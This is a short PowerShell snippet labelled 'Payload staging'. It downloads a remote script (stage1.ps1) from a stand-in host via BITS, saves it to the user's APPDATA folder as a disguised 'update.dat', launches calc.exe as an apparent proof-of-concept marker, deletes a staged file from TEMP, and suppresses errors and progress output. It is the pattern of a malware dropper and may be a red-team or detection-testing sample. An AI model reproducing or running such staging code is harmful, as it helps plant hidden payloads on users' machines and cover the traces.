
<# Payload staging #> $DownloadUrl = 'https://example.org/stage1.ps1'; $PayloadPath = "$env:APPDATA\update.dat"; $StageTimeout = 86; Start-BitsTransfer -Source $DownloadUrl -Destination $PayloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $ProgressPreference = "SilentlyContinue"
